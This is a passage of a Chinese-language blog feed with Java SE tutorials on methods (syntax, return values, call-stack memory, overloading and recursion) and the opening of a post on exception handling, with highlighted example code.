class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>add(a2,b2);<br> <br><span class="hljs-type">int</span> <span class="hljs-variable">a3</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-number">2000</span>;<br>add(a3,b3);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>System.out.println(a+<span class="hljs-string">&quot;+&quot;</span>+b+<span class="hljs-string">&quot;=&quot;</span>+(a+b));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>通过以上程序我们可以看出，其实方法也没什么神秘的，方法其实就是一段普通的代码片段，并且这段代码可以完成某个特定的功能，而且可以被<strong>重复的调用&#x2F;使用</strong>。java 中的方法又叫做method，在C 语言中叫做函数。</li><li>从现在开始大家以后在写代码的时候就要有定义方法的意识了，只要是可以独立出来的功能，我们都可以定义为单独的一个方法来完成，如果以后需要使用此功能时直接调用这个方法就行了，这样就会有效增强代码的”可复用性”了。</li><li>总结以上，就可以轻易的得到方法的定义了。<ul><li><strong>方法：就是一段可以完成某个特定功能的并且可以被重复利用<br>的代码片段。</strong><br>  <a name="PZNAy"></a></li></ul></li></ul><h2 id="2-方法的使用"><a href="#2-方法的使用" class="headerlink" title="2. 方法的使用"></a>2. 方法的使用</h2><ul><li>定义&#x2F;声明方法的语法格式如下所示：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sumInt</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;<br>    System.out.println(a + <span class="hljs-string">&quot;+&quot;</span> b + <span class="hljs-string">&quot;=&quot;</span> + c)<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* [修饰符列表] 返回值类型 方法名(形式参数列表)&#123;</span><br><span class="hljs-comment">*方法体；        </span><br><span class="hljs-comment">*&#125;</span><br><span class="hljs-comment">* public static------&gt;是修饰符列表</span><br><span class="hljs-comment">* void-------&gt;是返回值类型</span><br><span class="hljs-comment">* sumInt------&gt;是方法名</span><br><span class="hljs-comment">* (int a,int b)----&gt;形式参数列表(形参)，每一个形参都是局部变量</span><br><span class="hljs-comment">* 形参后面使用一对儿花括号，花括号当中的就是方法体，方法体是完成功能的核心代码，</span><br><span class="hljs-comment">* 方法体中的代码有执行顺序要求，遵循自上而下的顺序依次逐行执行，不存在跳行执行的情况</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sumInt</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;   <span class="hljs-comment">// sumInt之前的int为返回值类型</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li>接下来我将列出方法的相关规则，其中一些规则目前可能需要大家死记硬背，还有一些规则希望大家在理解的前提下进行记忆：<ul><li>（1）<strong>[修饰符列表]</strong>，此项是可选项，不是必须的，目前大家统一写成public static，后面的课程会详细讲解。</li><li>（2）<strong>返回值类型</strong>，此项可以是java 语言当中任何一种数据类型，包括基本数据类型，也包括所有的引用数据类型，当然，如果一个方法执行结束之后不准备返回任何数据，则返回值类型必须写void。返回值的类型例如：byte,short,int,long,float,double,boolean,char,String,void 等。</li><li>（3）<strong>方法名</strong>，此项需要是合法的标识符，开发规范中要求方法名首字母小写，后面每个单词首字母大写，遵循驼峰命名方式，见名知意，例如：login、getUsername、findAllUser 等。</li><li>（4）<strong>形式参数列表</strong>(int a, int b)，此项又被称为形参，其实<strong>每一个形参都是“局部变量</strong>”，形参的个数为0~N 个，如果是多个参数，则采用半角“,”进行分隔，形参中起<strong>决定性</strong>作用的是参数的<strong>数据类型</strong>，参数名就是变量名，变量名是可以修改的，也就是说(int a , int b)也可以写成(int x , int y)。</li><li>（5）<strong>方法体</strong>，由一对儿大括号括起来，在形参的后面，这个大括号当中的是实现功能的核心代码，方法体由java 语句构成，方法体当中的代码只能遵循<strong>自上而下</strong>的顺序依次逐行执行，不能跳行执行，核心代码在执行过程中如果需要外部提供数据，则通过形参进行获取。</li><li>（6）<strong>方法调用</strong>，当一个方法声明之后，我们应该如何去让这个方法执行呢，当然，这个时候就需要亲自去调用这个方法了，调用方法的语法格式是（前提是方法的修饰符列表中带<strong>有static 关键字</strong>）：“<strong>类名.方法名(实际参数列表)</strong>;”</li><li>注意：现在学习的方法都是带有<strong>static</strong>关键字的，也就是使用<strong>类</strong>就能够进行<strong>直接调用</strong>的，将来还有<strong>不带有static关键字</strong>的方法，是<strong>只有对象才能够调用</strong>的方法。</li><li>（7）关于<strong>实参</strong>，方法在调用的时候，实际传给这个方法的数据被称为实际参数列表，简称实参，java 语法中有这样的规定：<strong>实参和形参必须一一对应</strong>，所谓的一一对应就是，个数要一样，<strong>数据类型要对应相同</strong>。例如：实参(100 , 200)对应的形参(int x , int y)，如果不是一一对应则编译器就会报错。当然也可能会存在自动类型转换，例如：实参(100 , 200)也可以传递给这样的形参(long a , long b)。</li><li>（8）当在 a()方法执行过程中调用 b()方法的时候，并且 a()方法和 b()方法在同一个类当中，此时“类名.”可以省略不写，但如果 a()方法和 b()方法不在同一个类当中，“类名.”则不能省略。</li></ul></li><li>方法定义总结：整体来说方法的声明语法是很简单的，我相信每个人都能记住，其实我觉得方法的定义难度最大的不是语法，而是方法在定义的时候，返回值类型定为什么类型比较合适？方法的形式参数列表中定义几个参数合适？每个参数的数据类型定义为什么比较合适？方法的定义要不要传参数？传什么参数？要不要返回值？要什么返回值？这一切的设计都是由需求做决定的！！！<br>  <a name="S3BOb"></a></li></ul><h2 id="3-方法的返回值"><a href="#3-方法的返回值" class="headerlink" title="3.方法的返回值"></a>3.方法的返回值</h2><p><a name="N9MO3"></a></p><h3 id="3-1返回值概述"><a href="#3-1返回值概述" class="headerlink" title="3.1返回值概述"></a>3.1返回值概述</h3><ul><li>每个方法都是为了完成某个特定的功能，例如：登录功能、求和功能等，既然是功能，那么当这个功能完成之后，大多数情况下都会有一个结果的，比如，登录成功了或者失败了（true&#x2F;false），求和之后最后的结果是100 或者200，等等。这个结果本质上就是一个数据，那么既然是一个数据，就一定会有对应的类型，所以在方法定义的时候需要指定该方法的返回值类型。（注意：开发中也经常会设计没有返回值的方法）</li><li>java 语言中方法的返回值类型可以是任何一种数据类型，包括基本数据类型，也包括引用数据类型，例如：byte,short,int,long,float,double,boolean,char,String,Student（自定义类）等。当然，如果这个方法在执行完之后不需要返回任何数据，返回值类型必须写 void 关键字，不能空着不写。<br>  <a name="ZJ6Jc"></a></li></ul><h2 id="4-方法执行过程中内存的变化"><a href="#4-方法执行过程中内存的变化" class="headerlink" title="4.方法执行过程中内存的变化"></a>4.方法执行过程中内存的变化</h2><p><a name="VSdhq"></a></p><h3 id="4-1栈数据结构"><a href="#4-1栈数据结构" class="headerlink" title="4.1栈数据结构"></a>4.1栈数据结构</h3><ul><li>常见的数据结构有哪些呢？例如：栈、队列、链表、数组、树、图、堆、散列表等。目前我们先来学习一下栈（stack）数据结构，这是一种非常简单的数据结构。<br>如图所示：</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181455053.png"></li><li>栈（stack），它是一种运算受限的线性表。其限制是：仅允许在表的一端进行插入和删除运算。这一端被称为栈顶，相对地，把另一端称为栈底。向一个栈插入新元素又称作进栈、入栈或压栈（push），它是把新元素放到栈顶元素的上面，使之成为新的栈顶元素；从<br>一个栈删除元素又称作出栈、退栈或弹栈（pop），它是把栈顶元素删除掉，使其相邻的元素成为新的栈顶元素。</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181455084.png"></li><li>通过以上的学习，我们可以得知栈数据结构存储数据有这样的特点：<strong>先进后出</strong>，或者<strong>后进先出</strong>原则。也就是说最先进去的元素一定是最后出去，最后进去的元素一定是最先出去，因为一端是开口的，另一端是封闭的。<br>  <a name="k7XIv"></a></li></ul><h3 id="4-2方法执行过程中内存的变化"><a href="#4-2方法执行过程中内存的变化" class="headerlink" title="4.2方法执行过程中内存的变化"></a>4.2方法执行过程中内存的变化</h3><ul><li>对于虚拟机中的内存结构，目前我们只研究其中的“栈”。方法在执行过程中需要的内存空间在栈中分配。开始调用main 方法，main 方法被调用的瞬间，会给main 方法在“栈”内存中分配所属的活动空间，此时发生压栈动作，main 方法的活动空间处于栈底。也就是说，方法只定义不去调用的话，只是把它的代码片段存储在方法区当中，java 虚拟机是不会在栈内存当中给该方法分配活动空间的，只有在调用的瞬间，java 虚拟机才会在“栈内存”当中给该方法分配活动空间，此时发生压栈动作，直到这个方法执行结束的时候，这个方法在栈内存中所对应的活动空间就会释放掉，此时发生弹栈动作。由于栈的特点是先进后出，所以最先调用的方法（最先压栈）一定是最后结束的（最后弹栈）。比如：main 方法最先被调用，那么它一定是最后一个结束的。换句话说：main 方法结束了，程序也就结束了。案例：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;main begin&quot;</span>);<br>        m1();<br>        System.out.println(<span class="hljs-string">&quot;main over&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;m1 begin&quot;</span>);<br>        m2();<br>        System.out.println(<span class="hljs-string">&quot;m1 over&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;m2 begin&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;m2 over&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><br>执行结果：</p><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181501418.png" alt="image.png"></li><li>通过执行结果我们了解到，main 方法最先被调用，但是它是最后结束的，其中 m2方法最后被调用，但它是最先结束的。大家别忘了调用的时候分配内存是压栈，结束的时候是释放内存弹栈。<br>  <a name="iyemI"></a></li></ul><h2 id="5-方法重载-overload"><a href="#5-方法重载-overload" class="headerlink" title="5.方法重载&#x2F;overload"></a>5.方法重载&#x2F;overload</h2><ul><li>关于方法重载是什么，以及怎么进行重载，这些我们目前先不去研究，先来看看以下代码不使用方法重载机制，存在哪些缺点？</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">x1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">x2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">retValue1</span> <span class="hljs-operator">=</span> sumInt(x1 , x2);<br>    System.out.println(x1 + <span class="hljs-string">&quot;+&quot;</span> + x2 + <span class="hljs-string">&quot;=&quot;</span> + retValue1);<br>    <span class="hljs-type">long</span> <span class="hljs-variable">y1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10L</span>;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">y2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20L</span>;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">retValue2</span> <span class="hljs-operator">=</span> sumLong(y1 , y2);<br>    System.out.println(y1 + <span class="hljs-string">&quot;+&quot;</span> + y2 + <span class="hljs-string">&quot;=&quot;</span> + retValue2);<br>    <span class="hljs-type">double</span> <span class="hljs-variable">z1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10.0</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-variable">z2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20.0</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-variable">retValue3</span> <span class="hljs-operator">=</span> sumDouble(z1, z2);<br>    System.out.println(z1 + <span class="hljs-string">&quot;+&quot;</span> + z2 + <span class="hljs-string">&quot;=&quot;</span> + retValue3);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sumInt</span><span class="hljs-params">(<span class="hljs-type">int</span> a , <span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">sumLong</span><span class="hljs-params">(<span class="hljs-type">long</span> a , <span class="hljs-type">long</span> b)</span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">sumDouble</span><span class="hljs-params">(<span class="hljs-type">double</span> a , <span class="hljs-type">double</span> b)</span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>运行结果：</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181501967.png" alt="image.png"></li><li>我们可以看到以上三个方法功能“相似”，都是求和，只不过参与求和的数据类型不同，因此定义了三个方法，分别起了三个不同的方法名。这种方式会增加程序员编程的压力，因为程序员起码要记忆三个方法名，另外代码也不是很美观。所以，我们需要使用方法重载机制来解决这样的问题。</li><li>方法重载（overload）是指在一个类中定义多个同名的方法，但要求每个方法具有不同的参数的类型或参数的个数。调用重载方法时，Java 编译器能通过检查调用的方法的参数类型和个数选择一个恰当的方法。方法重载通常用于创建完成一组任务相似但参数的类型或参数的个数不同的方法。调用方法时通过传递给它们的不同个数和类型的实参来决定具体使用哪个方法。</li><li>什么情况下我们考虑使用方法重载呢？在同一个类当中，如果多个功能是相似的，可以考虑将它们的方法名定义的一致，使用方法重载机制，这样便于程序员的调用，以及代码美观，但相反，如果两个方法所完成的功能完全不同，那么方法名也一定要不一样，这样才是合理的。<br>构成方法重载需要满足以下3个条件：<ul><li><strong>在同一个类当中</strong>。</li><li><strong>方法名相同</strong>。</li><li><strong>参数列表不同</strong>：<strong>个数不同算不同，顺序不同算不同，类型不同也算不同</strong>。</li></ul></li><li>接下来我们来看看以下程序哪些方法构成了方法重载，哪些没有：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverloadText</span>&#123;<br>    <span class="hljs-comment">//方法1</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-comment">//方法2</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">long</span> i)</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-comment">//方法3</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">int</span> i,<span class="hljs-type">long</span> j)</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-comment">//方法4</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">long</span> j,<span class="hljs-type">int</span> i)</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-comment">//方法5</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">long</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-comment">//方法6</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-comment">//方法7</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSome</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>通过观察以上代码以及测试结果我们得知：<ul><li>方法5 和方法4 是一样的，仅仅只是形参的标识符不同，这不是方法重载，因为之前我们就说过方法形参中起决定性作用的是参数的数据类型，参数的名字随意，因为每一个形参都是局部变量，变量名自然是随意的。其中方法6 和方法1 相同，显然方法的重载和方法的返回值类型没有关系这也是合理的，因为之前我们提过，方法执行结束之后的返回值我们可以接收也可以不接收。另外方法7 和方法1 也无法构成重载，<strong>显然方法重载和修饰符无关</strong>。<br>  <a name="iLB1I"></a></li></ul></li></ul><h2 id="6-方法递归"><a href="#6-方法递归" class="headerlink" title="6.方法递归"></a>6.方法递归</h2><p><a name="ITOEz"></a></p><h3 id="6-1什么是方法递归"><a href="#6-1什么是方法递归" class="headerlink" title="6.1什么是方法递归"></a>6.1什么是方法递归</h3><ul><li>方法递归就是方法自己调用自己</li><li>我们先来看一段代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    m();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;m begin&quot;</span>);<br>    m();<br>    System.out.println(<span class="hljs-string">&quot;m over&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><br>执行结果：</p><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181502933.png" alt="image.png"></li><li>我们可以看到以上代码的执行过程中，一直输出“m begin”，“m over”一次也没有输出，直到最终发生了错误：java.lang.StackOverflowError，这个错误是栈内存溢出错误，错误发生后，JVM 退出了，程序结束了。 实际上以上代码在 m()方法执行过程中又调用了 m()方法，方法自身调用自身，这就是方法递归调用。m()方法一直在被调用（方法中的代码必须遵循自上而下的顺序依次逐行执行，不能跳行执行），对于栈内存来说一直在进行压操作，m()方法从未结束过，所以没有弹栈操作，即使栈内存足够大（也是有限的内存），总有一天栈内存会不够用的，这个时候就会出现栈内存溢出错误。通过以上研究得出递归必须要有合法的结束条件，没有结束条件就一定会发生StackOverflowError。</li><li>递归总结：<ul><li>一个递归程序有的时候存在合法有效的终止条件，但由于递归的太深，在还没有等到条件成立的时候，栈内存已经发生了溢出，这种情况也是存在的，所以实际开发中我们尽可能使用循环来代替递归算法，原则是：能不用递归尽量不用，能用循环代替的尽可能使用循环。</li></ul></li><li><br></li><li><br></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>面向对象</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---异常</title>
    <link href="/2020/05/02/JavaSe%E5%9F%BA%E7%A1%80---%E5%BC%82%E5%B8%B8/"/>
    <url>/2020/05/02/JavaSe%E5%9F%BA%E7%A1%80---%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-异常"><a href="#1-异常" class="headerlink" title="1 - 异常"></a>1 - 异常</h2><h3 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 - 基本概念"></a>1.1 - 基本概念</h3><pre><code class="hljs">异常，指不正常，在Java中异常处理机制能让程序在异常情况发生时按照事先设定好的逻辑方式去有针对性的处理异常的方式。</code></pre><h3 id="1-2-异常的主要分类"><a href="#1-2-异常的主要分类" class="headerlink" title="1.2 - 异常的主要分类"></a>1.2 - 异常的主要分类</h3><p>java.lang.Throwable类java中所有错误和异常的超类，已知直接子类有Error类和Exception类。</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><code>RuntimeException</code></td><td>运行时异常，也叫作非检测性异常</td></tr><tr><td><code>IOException</code></td><td>IO异常类，也叫作检测性异常</td></tr></tbody></table><p><strong>RuntimeException主要子类</strong></p><table><thead><tr><th>异常类型</th><th>说明</th></tr></thead><tbody><tr><td><code>ArithmeticException</code></td><td>算数异常</td></tr><tr><td><code>ArrayIndexOutofBoundsException</code></td><td>数组下标越界异常</td></tr><tr><td><code>NullPoniterException</code></td><td>空指针异常</td></tr><tr><td><code>ClassCastException</code></td><td>类型转换异常</td></tr><tr><td><code>NumberFormatException</code></td><td>数字格式异常</td></tr></tbody></table><p><strong>注意：</strong></p><pre><code class="hljs">当程序执行过程中产生异常并没有手动处理时，则采用默认的处理方式，打印异常名称、异常原因、异常的位置等信息，并终止程序，导致后续代码无法运行。</code></pre><p><strong>运行时异常的处理</strong></p><pre><code class="hljs">绝大多数的运行时异常都可以通过if判断的形式将其避免发生。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  RuntimeException 的主要子类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//针对于运行时异常有两种处理方式，1、通过if逻辑判断避免其发生  2、通过异常的捕获格式捕获异常</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//        if (b != 0)&#123;//当除数不为0，才可以运行</span><br><span class="hljs-comment">//            System.out.println(a/b);</span><br><span class="hljs-comment">//        &#125;</span><br>        <span class="hljs-comment">//通过异常捕获的方式处理运行时异常,虽然捕获也可以处理运行时异常类，</span><br>        <span class="hljs-comment">// 但是针对于运行时异常，通常需要使用if判断的方式将其避免发生</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//            System.out.println(a/b);</span><br><span class="hljs-comment">//        &#125;catch (ArithmeticException e)&#123;</span><br><span class="hljs-comment">//            e.printStackTrace();</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>        <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">5</span> &amp;&amp; pos &gt;= <span class="hljs-number">0</span>)&#123;<br>            System.out.println(arr[pos]);<span class="hljs-comment">//java.lang.ArrayIndexOutOfBoundsException</span><br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (s1 != <span class="hljs-literal">null</span>)&#123;<br>            System.out.println(s1.length());<span class="hljs-comment">//java.lang.NullPointerException</span><br>        &#125;<br><br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>();<br>        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> IOException)&#123;<br>            <span class="hljs-type">IOException</span> <span class="hljs-variable">e1</span> <span class="hljs-operator">=</span> (IOException) e;<span class="hljs-comment">//java.lang.ClassCastException</span><br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123abc&quot;</span>;<br>        <span class="hljs-keyword">if</span> (s2.matches(<span class="hljs-string">&quot;\\d+&quot;</span>))&#123;<br>            System.out.println(Integer.parseInt(s2));<span class="hljs-comment">//java.lang.NumberFormatException</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="a148184a"></a></p><h3 id="1-3-异常的捕获格式"><a href="#1-3-异常的捕获格式" class="headerlink" title="1.3 - 异常的捕获格式"></a>1.3 - 异常的捕获格式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>  编写可能会产生异常的语句；<br>&#125;<span class="hljs-keyword">catch</span>(异常类型 变量名)&#123;<br>  